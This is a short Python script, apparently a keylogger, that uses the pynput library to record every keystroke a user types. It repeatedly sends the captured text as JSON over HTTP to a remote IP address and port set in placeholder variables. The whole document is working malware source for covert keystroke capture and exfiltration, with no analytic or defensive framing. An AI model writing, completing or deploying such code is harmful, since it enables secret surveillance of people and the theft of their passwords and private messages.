from pynput import keyboard
import requests
import json
import threading

text = ""
ip = ""
port = ""
interval = ""

def post_request():
    try:
        payload = json.dumps({"keyboardData": text})
        r = requests.post(f"http://{ip}:{port}", data=payload,
        headers={"Content-Type": "application/json"})
        timer = threading.Timer(interval, post_request)
        timer.start()
    except:
        print("[!] Request failed.")

def key_down(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

with keyboard.Listener(on_press=key_down) as listener:
    post_request()
    listener.join()